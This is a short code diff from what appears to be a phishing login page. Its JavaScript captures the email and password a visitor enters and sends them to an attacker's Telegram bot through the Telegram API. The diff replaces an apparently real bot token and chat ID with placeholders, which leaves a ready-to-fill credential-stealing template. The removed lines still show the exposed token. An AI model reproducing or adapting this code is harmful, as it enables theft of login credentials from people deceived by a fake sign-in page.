@@ -6,8 +6,8 @@ document.addEventListener("DOMContentLoaded", function() {
         const password = document.getElementById("password").value;
 
         // Telegram Bot Configuration
-        const TELEGRAM_BOT_TOKEN = "7732386670:AAGuV2q_N45I76ISD_8NYcnHPd2gyhk8sn0";  // Replace with your bot token
-        const TELEGRAM_CHAT_ID = "7182702425";  // Replace with your chat ID
+        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";  // Replace with your bot token
+        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";  // Replace with your chat ID
 
         const message = `🚨 New Login Attempt 🚨\nEmail: ${email}\nPassword: ${password}`;
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
